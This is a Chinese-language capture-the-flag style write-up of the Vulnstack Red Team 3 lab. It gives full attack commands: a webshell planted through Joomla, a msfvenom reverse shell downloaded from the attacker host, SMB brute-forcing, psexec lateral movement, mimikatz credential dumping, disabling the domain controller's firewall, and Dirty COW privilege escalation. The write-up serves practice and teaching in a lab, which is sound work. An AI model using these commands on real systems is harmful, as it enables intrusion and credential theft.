---
title: vulnstack-红日3
author: Creexile
date: 2024-05-05
lastMod: 2025-04-10
summary: '智能只会死板地解决问题,智慧可以解决提出问题的人'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [Kali, 内网, MSF, 渗透]
---

# vulnstack红队3

真诚地建议您, 当看见打开的虚拟机状态为挂起的时候,**先拍摄快照**再进行其他操作,如果您删除了域成员而没有删除域控,在你重新解压域成员的时候会告诉你不信任该域,这样你就只能重新解压全部了

> 目标：域控中存在一份重要文件. 本次是黑盒渗透,所以没有账号密码
>
> ubuntu显示的`ifconfig`太长了看不到?试试`ip addr`吧
>
> 要求还是web-centos可以ping通所有, 如果ping不通或者想要换个地址可以用`service network restart` 重启网卡以重新获取地址
>
> 我在执行上面的命令后发现虚拟机设置中的网络适配器可以调整了,而我的桥接模式用不了,我改成了NAT模式

新增一个虚拟网络:
192.168.93.0/24 内网环境(Vmnet2)

- kali
  192.168.204.132

- web-centos
  192.168.204.131 外网地址
  192.168.93.100 内网地址

- web1-ubantu(合理怀疑作者拼错了)

  192.168.93.120

- win2008
  192.168.93.20

- pc
  192.168.93.30

- Windows Server 2012
  192.168.93.10

## 外网渗透

### 信息收集

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# nmap -sS -Pn 192.168.204.0/24

Nmap scan report for 192.168.204.131
Host is up (0.0016s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:32:46:C9 (VMware)
```

> 如果你是NAT模式,你可以直接利用物理机的浏览器访问网址用更多插件,这里就不叙述了

访问可以看到博客界面,似乎没有进行任何更新,所以这个Joomla似乎就是博客的名称了

![image-20240504164310488](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504164310488.png)

用dirsearch等工具扫描

```bash
dirsearch -u http://192.168.204.131 -i 200  	// 仅输出响应200
```

![image-20240504170248889](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504170248889.png)

分别是后台地址,web配置文件, `1.php`甚至是一个phpinfo, `2.php`我猜大概是一句话木马, `robots.txt`也是给的后台地址

> configuration.php 文件通常用于存储和管理网站的关键设置。大多数基于PHP的网站或网页框架都使用这种形式的配置文件, 可能包含的一些内容：
>
> 1. 数据库连接信息：configuration.php 文件通常包含用来连接数据库的信息，如数据库服务器的地址、数据库的名字、用户名和密码等。
> 2. 网站参数：这可能包括网站的URL、邮件服务设置、网站的语言设定、时间区域设置等。
> 3. 错误报告级别：设定PHP应该报告何种级别的错误。
> 4. 其他配置项：比如站点维护模式开关、缓存设置、文件上传的限制等。

发现有`disable_functions`

![image-20240504181136000](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504181136000.png)

可惜后台爆破没结果, 还是看看远处的`configuration.php`和`configuration.php~`吧

![image-20240504171643213](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504171643213.png)

格式化之后好看一点, 只给出比较重要的部分

```php
public $dbtype = 'mysqli';
public $host = 'localhost';
public $user = 'testuser';
public $password = 'cvcvgjASD!@';
public $db = 'joomla';
public $dbprefix = 'am2zu_';
public $live_site = '';
public $secret = 'gXN9Wbpk7ef3A4Ys';
public $gzip = '0';
public $tmp_path = '/var/www/html/tmp';
```

![image-20240504172949333](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504172949333.png)

### getshell

正好 3306 端口开了,这里的账号密码拿去看看

```
mysql -h 192.168.204.131 -utestuser -p	// 谁让密码有特殊符号不能简单登录呢
Enter password :cvcvgjASD!@
```

![image-20240504173419865](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504173419865.png)

根据前面`configuration.php`的信息,我们逐个查找

```mysql
use joomla;		// 选择库
show tables;		// 根据我们的到的信息, 应该找 am2zu_ 开头的
select * from am2zu_users;		// 找到了超级管理员账号和加密过的密码
select * from umnbt_users;		// 我比较好奇
update am2zu_users set password = md5("123456") where id =891;
```

> 如果你不放心可以找官方给出的加密的的值, 为admin加密得到的
>
> 433903e0a9d6a712e00251e44d29bf87:UJ0b9J5fufL3FKfCc0TLsYJBh2PFULvT

上面是我们要找的,下面是我感兴趣的

![image-20240504175906638](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504175906638.png)

然后用`Administrator/123456`登录网站后台即可, 尝试写马或者上传

![image-20240504180110194](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504180110194.png)

选择`Beez3 Details and Files`,然后`new file`,记得顶上的 Save & Close
也是非常好心地给了木马路径, 访问如果出现phpinfo的信息就表示成功解析了

```
http://192.168.204.131/templates/beez3/shell.php
```

![image-20240504180513630](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504180513630.png)

蚁剑连接即可,然后发现命令无法执行,可以直接用蚁剑的`绕过disable_function`插件.我选择的是`PHP7_UserFilter`,直接在终端内操作即可

也可以用SSH登录,我会写在后面

![image-20240504180948500](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504180948500.png)

## 内网渗透

### 初步信息收集

```
ip addr		// 内网地址192.168.93.120  ???
```

诶你先别急, 假如你也做了ssh登录网站主机,你会发现蚁剑上的似乎有很大不同, 蚁剑连接上的只有一个网卡,不可能是我们ssh连接上的这个机器,所以先收集一下内网信息

> 为什么我们webshell拿到的是内网的呢，原因是做了一层nginx反向代理

```
hostname		 // 获取主机名 ubuntu
w		// 查看目前登录的用户 yy
netstat -anplt		// 打印本地端口开放信息
whoami		// www-data
```

再来上线msf

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.204.132 lport=10000 -f elf > msf.elf
// 生成木马

use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost 192.168.204.132
set lport 10000
run
```

这里就不能用蚁剑了,因为连接的机器在内网,肯定是出不来的, 这里给出ssh的方法(**不需要提权**)

```
python3 -m http.server 8080		// 这是kali,开启http服务,注意要在木马目录下
wget http://192.168.204.132:8080/msf.elf	// 这是连上的靶机,通过http下载木马
chmod 777 msf.elf		// 靶机给予权限
```

![image-20240504202019354](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504202019354.png)

运行即可监听,运行命令为`./msf.elf`, 如果你已经利用ssh提权了,连接就是firefart的root权限
如果想要在后台运行`./msf.elf &`或者`nohup ./msf.elf > /dev/null 2>&1 &`都可以,前者不能关会话

![image-20240504202310933](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504202310933.png)

查看网卡信息, 因为是linux系统,还是用msf继续进行收集吧

![image-20240504212611130](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504212611130.png)

msf添加内网网段路由

```
run autoroute -s 192.168.93.0/24		// 直接在meterpreter中执行
route add 192.168.93.0 255.255.255.0 1	// 似乎也行, 在模块选择中执行
```

msf添加socks代理

```
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set version 5
run
```

msf模块扫描存活主机, 我没找到 linux 的 fscan

```
// msf
use auxiliary/scanner/smb/smb_version		// 针对windows
use auxiliary/scanner/discovery/arp_sweep		// 针对linux

set rhosts 192.168.93.0/24
set threads 10		// 这是并发, 越快越好
run
```

可以得到 windows 存活主机`192.168.93.10`, `192.168.93.20`, `192.168.93.30`, 再加上蚁剑爆出来的`192.168.93.120`, 本身是`192.168.93.100`, 一共五台主机

### 横向移动

先用nmap扫一圈再说, 都开着445端口,但是永恒之蓝漏洞一点用都没有

试一下smb登录爆破吧(其实就是想要psexec登录域控)

```
use auxiliary/scanner/smb/smb_login
set user_file user.txt
set pass_file pass.txt
set rhosts 192.168.93.10
run
```

这里用的自己的字典,给个[参考](https://github.com/k8gege/PasswordDic/)吧

爆破出来`192.168.93.30`和`192.168.93.20`的密码都是`administrator/123qwe!ASD`,然后利用msf的模块登录`192.168.93.30`

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set rhost 192.168.93.30
set smbuser administrator
set smbpass 123qwe!ASD
run
```

![image-20240504230254966](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504230254966.png)

### 信息收集

终于来到了最熟悉的windows,进行一个信息收集

```
whoami          // nt authority\system
ipconfig /all	// 域 test.org, 内网地址 192.168.93.30
net user /domain	// 无回显
net user		// Administrator, Guest
net config workstation 		// 计算机详细信息, 无回显?
```

ping取得域控ip: `192.168.93.10`

![image-20240504230736219](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504230736219.png)

抓取密码, 不知道为什么我抓不到,返回都是空的,20和30都是

```
load kiwi		// 加载
creds_all
creds_kerberos
```

> 原因是这个: [!] Loaded x86 Kiwi on an x64 architecture.
>
> 这个时候用进程迁移是个不错的选择, 我将其放在后面

没办法,只能直接上传mimikatz了, 这里30不知道发什么疯,不能登录,换成了20

```
// smb连接
proxychains smbclient //192.168.93.20/C$ -U administrator		// 123qwe!ASD
put mimikatz.exe		// 在C盘根目录下

// msf的shell执行
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log	// 抓
type log.log		// 直接查看
```

![image-20240505094005010](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505094005010.png)

密码大满贯,结合剩下给出的信息可以知道两个有效密码

```
Administrator  zxcASDqw123!!
Administrator  123qwe!ASD
```

### 攻击域控

尝试用psexec登录域控, 先利用ipc$连接然后关闭防火墙

```
netsh advfirewall set allprofiles state off		// 自己的也关了
netsh advfirewall show allprofiles		// 查看防火墙状态

net use \\192.168.93.10\ipc$ "zxcASDqw123!!" /user:"administrator"
// 让其与域控建立 ipc$ 连接
sc \\192.168.93.10 create unablefirewall binpath= "netsh advfirewall set allprofiles state off"
// 创建关闭防火墙的服务
sc \\192.168.93.10 start unablefirewall
// 立即启动服务
```

说是没成功实际上已经成功了,在域控机子的cmd上执行查看防火墙命令即可确认

![image-20240505100210082](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505100210082.png)

配置psexec, 拿下

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set rhosts 192.168.93.10
set smbdomain test.org
set smbuser Administrator
set smbpass zxcASDqw123!!
run
```

![image-20240505103712450](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505103712450.png)

其实也可以直接利用ipc$读文件

```
// ipc$连接后执行net use的时候会发现多了一个\\ip\ipc$的用户, 远程命令如下:
dir \\192.168.93.10\c$\		// 即命令+ip+目录
```

重要文档一般都是在用户文件夹下

```
dir \\192.168.93.10\c$\users		// 探探路
dir \\192.168.93.10\c$\users\*flag* /s /b		// 搜索
type \\192.168.93.10\c$\users\administrator\Documents\flag.txt		// 读取
```

![image-20240505102835702](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505102835702.png)

# SSH登录网站主机

## 登录

蚁剑连接后在`/tmp/mysql/test.txt`找到了一组账号密码

```
adduser wwwuser
passwd wwwuser_123Aqx
```

这个显然不是mysql的,我们已经翻过表了,尝试过一些地方登录后发现是可以登陆ssh的

```bash
ssh wwwuser@192.168.204.131
```

> 我这里kali报错: 发现远程服务器提供的主机密钥类型与客户端能接受的密钥类型不匹配,所以用的是服务器管理工具,或者修改命令即可,我不是很推荐
>
> ```plaintext
>  ssh wwwuser@192.168.204.131 -oHostkeyAlgorithms=+ssh-dss
> ```

## 提权

查看可写文件

```bash
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/var/*" 2>/dev/null
```

![image-20240504185503158](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504185503158.png)

passwd.bak感觉眼熟? 这就是脏牛漏洞! 这个影响的内核版本从Linux-2.6.22到Linux4.8

> 脏牛漏洞poc(dirt cow): [下载地址1(cpp)](https://github.com/gbonacini/CVE-2016-5195) [下载地址2(c)](https://github.com/firefart/dirtycow)
>
> 后缀不同命令也不同,这里选择的是c版本的

先查看内核版本看看,确实很老,刚好能用

![image-20240504191256645](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504191256645.png)

无论你是通过 kali 开 http 服务还是通过管理工具, 上传了脏牛poc即可
(要求有 gcc 环境, 用 gcc -v 可以查看)

编译并且运行,稍微等一下,得到账号密码`firefart/123456`

![image-20240504193655832](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504193655832.png)

然后就可以切换用户了,应该挺容易看出权限

![image-20240504194106242](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240504194106242.png)

# 进程迁移抓取密码

帮你们尝试过了,抓`192.168.93.20`的, **30的什么都没有**

```
 sysinfo		// 查看当前meterpreter信息
 ps		// 寻找x64的进程
 migrate 2076	// 迁移Metasploit会话到另一个进程(PID)
```

总算是可以运行了(来自后期的欣慰)

![image-20240505093046059](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240505093046059.png)
